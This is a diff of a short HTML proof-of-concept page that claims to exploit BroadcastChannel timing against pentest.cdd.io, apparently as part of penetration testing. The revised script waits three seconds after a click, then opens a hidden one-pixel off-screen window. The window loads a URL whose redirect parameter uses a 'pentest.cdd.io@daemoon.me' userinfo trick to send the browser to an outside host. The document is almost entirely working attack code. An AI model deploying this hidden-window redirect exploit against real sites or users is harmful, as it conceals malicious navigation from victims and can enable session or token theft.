@@ -8,24 +8,25 @@
     <h1>BroadcastChannel PoC</h1>
     <p>This page will try to exploit BroadcastChannel timing.</p>
 
-    <script>
-        console.log("PoC Loaded");
-
-    </script>
     <a href="javascript:void(0)" onclick="openTabs()">Click to start</a>
 
     <script>
-    function openTabs() {
-    const preload = window.open(
-        "https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40daemoon.me",
-        "_blank"
-    );
+        function openTabs() {
+            // Step 1: Open login page first (visible tab)
+            // const loginWindow = window.open(
+            //     "https://pentest.cdd.io/user/session/new",
+            //     "_blank"
+            // );
 
-    setTimeout(() => {
-        window.open("https://pentest.cdd.io/user/session/new", "_blank");
-    }, 3000);
-    }
-</script>
-
+            // Step 2: After 3 seconds, open the redirect attack page (hidden tab)
+            setTimeout(() => {
+                const redirectWindow = window.open(
+                    "https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40daemoon.me",
+                    "_blank",
+                    "width=1,height=1,left=-1000,top=-1000" // hide it
+                );
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
